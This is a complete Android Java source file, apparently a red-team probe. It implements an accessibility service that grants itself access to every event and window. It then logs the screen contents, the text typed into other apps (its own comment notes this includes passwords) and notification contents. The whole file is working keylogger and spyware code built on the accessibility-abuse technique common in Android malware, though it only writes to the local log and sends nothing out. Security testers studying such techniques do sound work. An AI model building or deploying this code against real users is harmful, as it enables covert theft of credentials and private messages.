package com.redteam.probe;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

public class ProbeAccessibility extends AccessibilityService {
    private static final String TAG = "RedTeamProbe";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "null";
        String cls = event.getClassName() != null ? event.getClassName().toString() : "null";

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            Log.i(TAG, "A11Y WINDOW: " + pkg + "/" + cls);
        }

        // Log text content changes (can see passwords being typed, etc.)
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText() != null && event.getText().size() > 0
                ? event.getText().get(0) : null;
            Log.i(TAG, "A11Y TEXT: " + pkg + " → " + (text != null ? text.toString() : "null"));
        }

        // Capture notifications
        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            Log.i(TAG, "A11Y NOTIF: " + pkg + " → " + event.getText());
        }
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "A11Y SERVICE INTERRUPTED");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "A11Y SERVICE CONNECTED - can now read all screen content");

        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            | AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
            | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }
}
